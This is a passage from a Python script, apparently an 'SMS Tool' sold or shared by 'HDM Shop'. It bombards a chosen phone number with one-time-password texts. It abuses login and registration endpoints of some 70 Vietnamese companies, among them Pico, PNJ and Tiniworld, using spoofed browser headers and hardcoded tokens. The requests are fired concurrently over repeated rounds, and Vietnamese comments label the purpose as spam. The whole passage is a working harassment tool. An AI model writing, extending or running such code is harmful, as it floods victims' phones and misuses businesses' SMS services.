        'phone': sdt,
        'provinceCode': '92',
        'districtCode': '925',
        'wardCode': '31261',
        'address': '123',
    }
    try:
        requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers1, json=json_data_1, timeout=15)
        headers2 = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'access': '206f5b6838b4e357e98bf68dbb8cdea5',
            'channel': 'b2c',
            'origin': 'https://pico.vn',
            'party': 'ecom',
            'platform': 'Desktop',
            'referer': 'https://pico.vn/',
            'region-code': 'MB',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'uuid': 'cc31d0b5815a483b92f547ab8438da53',
        }
        json_data_2 = {'phone': sdt}
        r = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers2, json=json_data_2, timeout=15)
        print(f"[PICO] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[PICO] Lỗi: {e}")


# ============================================================
# 70. PNJ
# ============================================================
def send_otp_via_PNJ(sdt):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.pnj.com.vn',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': sdt,
    }
    try:
        r = requests.post('https://www.pnj.com.vn/customer/otp/request', headers=headers, data=data, timeout=15)
        print(f"[PNJ] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[PNJ] Lỗi: {e}")


# ============================================================
# 71. TINIWORLD
# ============================================================
def send_otp_via_TINIWORLD(sdt):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'referer': 'https://prod-tini-id.nkidworks.com/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    data = {
        '_csrf': '',
        'clientId': '609168b9f8d5275ea1e262d6',
        'redirectUrl': 'https://tiniworld.com',
        'phone': sdt,
    }
    try:
        r = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', headers=headers, data=data, timeout=15)
        print(f"[TINIWORLD] {sdt}: {r.status_code}")
    except Exception as e:
        print(f"[TINIWORLD] Lỗi: {e}")


# ============================================================
# RUN FUNCTIONS
# ============================================================
def run(phone, round_num=1):
    """Chạy spam SMS 1 lần (bot gọi)"""
    functions = [
        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
        send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
        send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
        send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
        send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
        send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_futabus, send_otp_via_ViettelPost,
        send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE, send_otp_via_30shine,
        send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk, send_otp_via_vietloan2,
        send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi, send_otp_via_mutosi1,
        send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness, send_otp_via_modcha35,
        send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio, send_otp_via_Routine,
        send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo, send_otp_via_takomo,
        send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Lỗi: {exc}')

    print(f"✅ Spam xong lần {round_num}")


def run_multi(phone, count):
    """Chạy spam nhiều lần (bot gọi hàm này)"""
    for i in range(1, count + 1):
        run(phone, i)
        if i < count:
            time.sleep(3)


# ============================================================
# CHẠY TRỰC TIẾP (chỉ khi chạy file độc lập)
# ============================================================
if __name__ == "__main__":
    print("\033[1;34mHDM Shop - SMS Tool\033[0m")
    phone = input("Nhập SĐT: ")
    count = int(input("Nhập số lần spam: "))
    run_multi(phone, count)
